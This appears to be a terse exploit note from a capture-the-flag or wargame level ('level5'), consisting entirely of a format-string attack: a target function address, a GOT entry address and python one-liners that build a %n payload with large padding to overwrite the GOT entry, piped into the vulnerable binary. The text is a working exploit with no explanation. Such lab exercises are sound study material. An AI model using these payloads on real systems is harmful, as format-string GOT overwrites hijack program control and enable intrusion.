0x080484a4 <- function to call
python -c 'print("\x38\x98\x04\x08" + "%08x.%08x.%08x.%n")' <- GOT entry to overwrite.

python -c 'print("\x38\x98\x04\x08" + "%08x.%08x.%0134513808x.%n")' | ./level5